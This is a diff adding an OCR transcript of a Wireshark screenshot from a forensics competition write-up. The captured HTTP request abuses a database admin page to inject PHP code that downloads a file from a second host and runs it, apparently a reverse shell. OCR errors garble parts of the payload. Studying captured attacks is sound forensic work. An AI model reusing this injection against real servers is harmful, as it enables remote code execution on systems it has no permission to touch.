@@ -1,0 +1,17 @@
+# OCR: f725a6da6222d1f7d772959a156fcc78.webp
+# 来源: ./02-WriteUp/2024/2024-数证杯-初赛/f725a6da6222d1f7d772959a156fcc78.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+Wireshark·追踪HTTP流(tcp.streameg3260)·流量分析.pcapng
+PosT/dbadmin/testdb.php?action=tablecreate&confirm=1HTTP/1.1
+Host:192.168.75.131 Content-Length:186
+Cache-Control:max-age=o
+Upgrade-Insecure-Requests:1 Origin:http://192.168.75.131
+Content-Type：application/x-www-form-urlencoded
+User-Agent:Mozi1la/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,1ikeGecko)Chrome/120.0.6099.71Safari/537.36
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=.8,application/signed-exchange;v=b 3;q=0.7
+Referer：http://192.168.75.131/dbadmin/testdb.php?action=tablecreate
+Accept-Encoding:gzip,deflate,br Accept-Language:en-us,en;q=o.9
+Cookie：pla3412=admin；pla3412salt=bvtcklkl3pk；PHPSEssID=4r06r9gjmcujs0ja9r8bst8p65 Connection:close
+tablename=rev&rows=1&0fie1d=re&0tvpe=INTEGER&0defaultvalue=%3C%3Fphp+system%28%22wget+192.168.75.132%3A2000%2Frev.txt+-0+%2Ftmp%2Frev-php%3B+php+%2Ftmp%2Frev.php%22%29%3B+%3F%3E%27%29HTTP/1.120o0K
